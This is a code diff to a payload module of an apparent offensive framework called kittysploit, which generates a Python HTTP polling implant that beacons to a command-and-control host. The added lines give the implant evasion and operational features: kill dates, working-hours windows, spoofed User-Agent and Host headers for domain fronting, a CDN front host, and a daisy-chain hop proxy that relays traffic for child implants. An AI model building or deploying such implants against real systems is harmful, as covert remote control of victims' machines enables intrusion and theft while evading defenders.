@@ -1,5 +1,6 @@
 from kittysploit import *
 
+from lib.c2.beacon_profile import BeaconProfile
 from lib.c2.http_polling_agent import build_http_polling_agent_script
 
 
@@ -9,7 +10,10 @@ class Module(Payload):
 
     __info__ = {
         "name": "Multi Python HTTP Polling Beacon",
-        "description": "HTTP polling implant with jitter, cover traffic, and Ed25519 implant identity",
+        "description": (
+            "HTTP polling implant with beacon profile (jitter, kill date, working hours), "
+            "cover traffic, optional daisy-chain hop, and Ed25519 implant identity"
+        ),
         "category": PayloadCategory.CMD,
         "arch": Arch.PYTHON,
         "platform": Platform.MULTI,
@@ -18,12 +22,27 @@ class Module(Payload):
         "session_type": SessionType.POLLING,
     }
 
-    lhost = OptString("127.0.0.1", "Callback host", True)
+    lhost = OptString("127.0.0.1", "Callback host (C2 or parent hop)", True)
     lport = OptPort(8088, "Callback port", True)
     url_prefix = OptString("/c2", "URL prefix (must match listener)", False, True)
     client_id = OptString("", "Client/implant ID (auto with implant_identity)", False, True)
     poll_interval = OptInteger(10, "Base poll interval seconds", False, True)
     jitter_percent = OptInteger(35, "Poll jitter percent", False, True)
+    kill_date = OptString("", "Kill date ISO (YYYY-MM-DD); empty=never", False, True)
+    working_hours = OptString("", "Active window HH:MM-HH:MM; empty=always", False, True)
+    timezone = OptString("UTC", "Timezone for kill date / working hours", False, True)
+    sleep_outside_hours = OptInteger(3600, "Local sleep when outside working hours", False, True)
+    user_agent = OptString("Mozilla/5.0", "HTTP User-Agent", False, True)
+    host_header = OptString("", "Optional Host header (domain fronting)", False, True)
+    payload_comms_host = OptString("", "Optional connect host (CDN/front); empty=lhost", False, True)
+    chain_token = OptString("", "Shared secret for daisy-chain (X-KS-Chain-Token)", False, True)
+    chain_listen_port = OptInteger(
+        0,
+        "If >0, also run local hop proxy on this port for child implants",
+        False,
+        True,
+    )
+    chain_listen_host = OptString("0.0.0.0", "Hop proxy bind address", False, True)
     cover_traffic = OptBool(True, "Send decoy HTTP requests between polls", False, True)
     use_ssl = OptBool(False, "Use HTTPS callback", False, True)
     python_binary = OptString("python3", "Python interpreter on target", True)
@@ -36,16 +55,29 @@ class Module(Payload):
         elif not client_id:
             client_id = "agent1"
 
+        profile = BeaconProfile.from_opts(self)
+        chain_token = str(
+            getattr(getattr(self, "chain_token", None), "value", self.chain_token) or ""
+        ).strip()
+        chain_listen_port = int(
+            getattr(getattr(self, "chain_listen_port", None), "value", self.chain_listen_port) or 0
+        )
+        chain_listen_host = str(
+            getattr(getattr(self, "chain_listen_host", None), "value", self.chain_listen_host)
+            or "0.0.0.0"
+        )
+
         script = build_http_polling_agent_script(
             str(self.lhost),
             int(self.lport),
             client_id,
             url_prefix=str(self.url_prefix or "/c2"),
-            poll_interval=float(self.poll_interval or 10),
-            jitter_percent=float(self.jitter_percent or 35),
-            cover_traffic=bool(self.cover_traffic),
             use_ssl=bool(self.use_ssl),
             private_key_pem=identity.private_key_pem if identity else None,
+            profile=profile,
+            chain_token=chain_token,
+            chain_listen_port=chain_listen_port,
+            chain_listen_host=chain_listen_host,
         )
 
         import base64 as b64
